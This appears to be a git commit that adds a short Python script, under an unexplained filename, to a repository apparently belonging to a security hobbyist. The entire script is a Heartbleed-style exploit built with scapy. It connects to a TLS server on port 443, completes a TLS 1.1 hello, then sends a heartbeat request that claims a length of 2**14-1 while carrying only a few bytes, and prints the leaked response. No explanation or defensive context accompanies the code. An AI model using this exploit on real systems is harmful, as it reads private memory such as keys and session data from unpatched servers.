9b9f4ca8201c628a6324f25beda8be7c4616ae7b
nu11secur1ty <venvaropt@gmail.com>
2019-11-28 11:24:08 +0200

    Create bahtavdreata.py

---
+++ Maachujdo/headersSSL/bahtavdreata.py
@@ -0,0 +1,17 @@
+import scapy
+from scapy.layers.ssl_tls import *
+import socket
+
+target = ('target.local',443)
+
+# create tcp socket
+s = socket.socket(socket.AF_INET,socket.SOCK_STREAM)
+s.connect(target)
+p = TLSRecord(version="TLS_1_1")/TLSHandshake()/TLSClientHello(version="TLS_1_1")
+s.sendall(str(p))
+s.recv(8192)
+p = TLSRecord(version="TLS_1_1")/TLSHeartBeat(length=2**14-1,data='bleed...')
+s.sendall(str(p))
+resp = s.recv(8192)
+print "resp: %s"%repr(resp)
+s.close()
